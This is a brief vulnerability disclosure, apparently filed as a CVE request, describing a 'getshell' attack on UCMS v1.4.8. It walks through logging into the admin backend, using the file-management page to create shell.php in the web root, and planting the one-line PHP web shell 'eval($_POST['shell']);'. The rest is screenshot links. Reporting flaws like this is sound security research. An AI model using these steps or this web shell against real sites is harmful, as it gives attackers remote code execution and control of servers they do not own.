
UCMS v1.4.8 getshell


Vulnerability Version :

1.4.8

Open the URL [http://127.0.0.1/login.php](http://127.0.0.1/login.php), Login to the background.

Open the URL [http://127.0.0.1/ucms/index.php?do=sadmin_file](http://127.0.0.1/ucms/index.php?do=sadmin_file)

Create a shell.php file to submit

![submit](https://github.com/mySQLserver010/CVE_Request/blob/master/CVE_Request/img/UCMS.png)


![submit](https://github.com/mySQLserver010/CVE_Request/blob/master/CVE_Request/img/UCMS2.png)

Put the request just in the root directory


![submit](https://github.com/mySQLserver010/CVE_Request/blob/master/CVE_Request/img/UCMS3.png)

found the poc： php eval($_POST['shell']);

![submit](https://github.com/mySQLserver010/CVE_Request/blob/master/CVE_Request/img/UCMS5.png)


getshell

![submit](https://github.com/mySQLserver010/CVE_Request/blob/master/CVE_Request/img/UCMS4.png)

